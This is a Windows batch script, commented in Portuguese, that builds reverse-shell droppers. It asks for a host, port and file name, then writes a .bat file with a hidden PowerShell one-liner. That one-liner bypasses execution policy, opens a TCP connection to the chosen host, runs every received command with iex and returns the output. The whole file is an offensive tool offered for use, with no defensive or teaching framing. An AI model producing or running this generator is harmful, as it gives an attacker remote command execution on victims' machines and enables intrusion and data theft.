@echo off
setlocal

REM Solicita ao usuário o HOST, a PORTA e o NOME DO ARQUIVO
set /p host=Digite o HOST: 
set /p port=Digite a PORTA: 
set /p filename=Digite o nome do arquivo (com extensão .bat): 

REM Verifica se o nome do arquivo termina com .bat
echo %filename% | findstr /E /I /C:".bat" >nul
if %errorlevel% neq 0 (
    set filename=%filename%.bat
)

REM Conteúdo do script .bat de reverse shell
set "bat_script=@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('%host%',%port%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"
exit"

REM Cria o arquivo .bat com o conteúdo do reverse shell
echo %bat_script% > %filename%

echo Arquivo %filename% criado com sucesso!

endlocal
pause
